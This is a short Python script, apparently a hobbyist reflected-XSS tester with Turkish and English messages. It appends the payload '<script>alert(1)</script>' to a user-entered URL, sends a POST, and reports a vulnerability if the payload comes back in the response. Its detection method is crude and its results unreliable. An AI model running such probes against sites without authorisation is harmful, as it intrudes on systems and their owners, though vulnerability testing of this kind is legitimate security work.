
import os 
import requests
import time

os.system("sudo apt-get install figlet")

print("--------------------------------")
os.system("figlet XALE")
print("Hedef URL XSS Test Aracı - Target URL XSS Tester")
print("--------------------------------")
payload = '<script>alert(1)</script>'
print("1. Deneme ")
url = input("Hedef URL : ")
req = requests.post(url + payload)
if payload in req.text:
 print("XSS Açığı Keşfedildi.")
 print('Payload : <script>alert(1)</script>')

else: 
 print("Payload Başarısız.")








